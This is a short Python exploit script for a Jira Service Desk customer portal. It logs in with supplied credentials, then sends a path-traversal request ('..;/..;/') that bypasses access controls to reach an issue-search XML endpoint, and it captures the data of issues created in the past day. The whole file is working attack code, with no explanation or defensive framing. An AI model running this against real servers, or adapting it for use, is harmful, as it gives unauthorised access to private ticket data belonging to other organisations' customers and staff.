import requests, json

class ServiceExploit:
	def __init__(self, target, username, password):
		# initiate login
		self.target = target
		headers = {'Content-Type':'application/x-www-form-urlencoded'}
		loginData = 'os_username={email}&os_password={password}&os_cookie=true'.format(email=username, password=password)
		url = 'https://{target}/servicedesk/customer/user/login'.format(target=target)
		sendLogin = requests.post(url, data=loginData, headers=headers)
		responseJson = json.loads(sendLogin.text)
		if responseJson['loginSucceeded']:
			self.cookies = sendLogin.cookies
		else:
			print('Error in login')
			print(responseJson)

	def startExploit(self):
		if hasattr(self, 'cookies'):
			url = 'https://{target}/servicedesk/customer/..;/..;/sr/jira.issueviews:searchrequest-xml/temp/SearchRequest.xml?jqlQuery=created+>+-1d'.format(target=self.target)
			sendRequest = requests.get(url, cookies=self.cookies)
			if sendRequest.status_code == 200:
				self.result = sendRequest.text
				return True
			else:
				return False
		else:
			return False
